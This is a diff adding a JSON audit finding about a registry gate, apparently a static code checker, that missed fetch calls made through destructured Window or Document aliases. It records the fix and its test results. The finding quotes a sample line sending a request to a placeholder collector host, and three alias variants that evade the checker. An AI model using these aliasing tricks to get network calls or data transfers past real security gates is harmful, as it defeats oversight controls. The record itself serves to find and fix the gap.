@@ -1,0 +1,30 @@
+{
+  "schemaVersion": 1,
+  "finding": "SEC-37-115",
+  "auditId": "AUD-277",
+  "severity": "medium",
+  "title": "Registry gate accepted fetch through a destructured Window proxy alias",
+  "source": "const { window: browserWindow } = globalThis; const request = browserWindow.fetch; request(\"https://collector.invalid/data\");",
+  "sourceExecution": "none; TypeScript AST analysis only",
+  "reproduction": {
+    "beforeFix": "The source checker returned pass for a fetch alias after destructuring globalThis.window into a renamed binding.",
+    "command": "pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts",
+    "afterFix": "The checker rejects destructured window, frames, and Document.defaultView aliases; the full contribution gate also rejects the representative destructured window source."
+  },
+  "variantsNowRejected": [
+    "const { window: browserWindow } = globalThis; browserWindow.fetch(...)",
+    "const { frames: frameProxy } = globalThis; frameProxy.fetch(...)",
+    "const { defaultView: activeWindow } = document; activeWindow.fetch(...)"
+  ],
+  "remediation": "Resolve variable binding elements whose statically named property is a Window proxy member and whose initializer is already a trusted Window or Document reference.",
+  "validation": {
+    "focusedRegression": "2 tests passed; three destructured Window/Document proxy variants rejected, with representative full contribution-gate rejection.",
+    "registryGatePackage": "76 tests passed.",
+    "typecheck": "22 workspace packages passed.",
+    "changedFileLint": "passed.",
+    "fullWorkspaceTests": "1206 tests passed in 77 files.",
+    "auditAll": "passed all 16 behavioral gates; scanned 324/324 canonical resources; built the 718-page Astro site and Sites Worker; bundle budgets, provenance, secret/security, and dependency audits passed."
+  },
+  "deployment": "not deployed; release-candidate verification remains open",
+  "capturedAtUtc": "2026-10-22T13:58:49.0443148Z"
+}
